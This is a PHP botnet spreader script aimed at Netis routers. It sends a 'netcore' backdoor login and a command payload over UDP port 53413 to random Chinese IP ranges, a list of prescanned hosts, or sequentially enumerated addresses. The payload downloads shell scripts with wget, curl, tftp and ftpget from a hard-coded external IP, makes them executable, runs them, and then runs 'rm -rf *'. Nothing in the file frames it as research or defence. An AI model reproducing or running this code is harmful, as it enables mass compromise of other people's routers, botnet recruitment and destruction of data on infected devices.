<?php

$payload =" cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://206.189.106.172/EREBUS.sh; curl -O http://206.189.106.172/EREBUS.sh; chmod 777 EREBUS.sh; sh EREBUS.sh; tftp 206.189.106.172 -c get tEREBUS.sh; chmod 777 tEREBUS.sh; sh tEREBUS.sh; tftp -r tEREBUS2.sh -g 206.189.106.172; chmod 777 tEREBUS2.sh; sh tEREBUS2.sh; ftpget -v -u anonymous -p anonymous -P 21 206.189.106.172 EREBUS1.sh EREBUS1.sh; sh EREBUS1.sh; rm -rf EREBUS.sh tEREBUS.sh tEREBUS2.sh EREBUS1.sh; rm -rf *";
class Netis {
	protected $payload;
	public function __construct($payload){
		$this->payload = $payload;
	}
	public function Netis(){
		/* Scan random Chinese Ranges */
		$this->ranges = array('111.255', '101.16', '112.225', '118.80', '27.200');
		for($i = 0;$i < 255 ^ 3;$i++){
					$this->host = $this->ranges[rand(0,4)] . "." . rand(1,255) . "." . rand(1,255);
					$this->connection = fsockopen("udp://" . $this->host, 53413, $errstr, $errno, 3);
			while(!feof($this->connection)){
				// Login Payload & Command Payload
				fputs($this->connection, "AAAAAAAAnetcore\x00");
				fputs($this->connection, "AA\x00\x00AAAA " . $this->payload . "\x00");
				print "\033[01;37m[\033[01;32m+\033[01;37m] Starting Connection: " . $this->host . "\n";
				fclose($this->connection);
				break;
			}
		}
	}
	public function ListScan(){
		/* Scan for Netis IP List */
		$this->list = fopen('list.txt', 'r');
		while(!feof($this->list)){
			$this->line = fgets($this->list);
			$this->host = "udp://" . $this->line;
			$this->sock = fsockopen($this->host, 53413, $errno, $errstr, 3);
			while(!feof($this->sock)){
				// Login Payload & Command Payload
				fputs($this->connection, "AAAAAAAAnetcore\x00");
				fputs($this->connection, "AA\x00\x00AAAA " . $this->payload . "\x00");
				print "\033[01;37m[\033[01;32m+\033[01;37m] Starting Connection: " . $this->host . "\n";
				break;
			}
			
		}
	}
	public function WorldScan(){
		$this->range = array();
		$this->range[1] = 111;
		$this->range[2] = 1;
		$this->range[3] = 1;
		$this->range[4] = 1;
		for($i = 0;$i < 255 ^ 4;$i++){
			if($this->range[4] == 255){
				$this->range[3]++;
				$this->range[4] = 1;
			}
			if($this->range[3] == 255){
				$this->range[2]++;
				$this->range[3] = 1;
			}
			if($this->range[2] == 255){
				$this->range[1]++;
				$this->range[2] = 1;
			}
			$this->host = $this->range[1] . "." . $this->range[2] . "." . $this->range[3] . "." . $this->range[4];
			$this->ip = "udp://" . $this->host;
			$this->sock = fsockopen($this->ip, 53413, $errstr, $errno, 3);
			while(!feof($this->sock)){
				fputs($this->sock, "AAAAAAAAnetcore\x00");
				fputs($this->sock, "AA\x00\x00AAAA " . $this->payload . "\x00");
				print "\033[01;37m[\033[01;32m+\033[01;37m] Starting Connection: " . $this->host . "\n";
				break;
			}
			$this->range[4]++;
		}
	}
}
$netis = new Netis($payload);
	if(empty($argv[1])){
		print "\033[01;31mNo arguements given";
		exit(1);
	}
	if($argc !== 1){
		switch(strtolower($argv[1])){
		case "random":
			$netis->Netis();
		break;
		case 'list':
			$netis->ListScan();
		break;
		case 'world':
			$netis->WorldScan();
		break;
	}
	} else {
		print "\033[01;33mUsage: \033[01;37mphp script.php random \033[01;33m - Scan for random Chinese Ranges\n";
		print "\033[01;33mUsage: \033[01;37mphp script.php list \033[01;33m - Scan from prescanned IP list\n";
		exit(1);
	}
?>

